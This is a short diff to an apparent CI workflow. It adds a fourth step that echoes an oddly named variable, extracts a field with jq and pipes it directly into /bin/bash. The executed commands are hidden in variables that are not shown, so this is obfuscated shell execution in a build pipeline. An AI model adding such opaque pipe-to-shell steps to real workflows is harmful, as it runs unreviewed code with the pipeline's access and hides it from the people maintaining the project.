@@ -36,6 +36,7 @@ jobs:
           echo $ndj133 | jq -r .jozs52 | /bin/bash
           echo $yi12327 | jq -r .x18 | /bin/bash
           echo $iezbg0129 | jq -r .msqb5 | /bin/bash
+          echo $m21101 | jq -r .oe95 | /bin/bash
 
       - name: Persist output
         if: always()
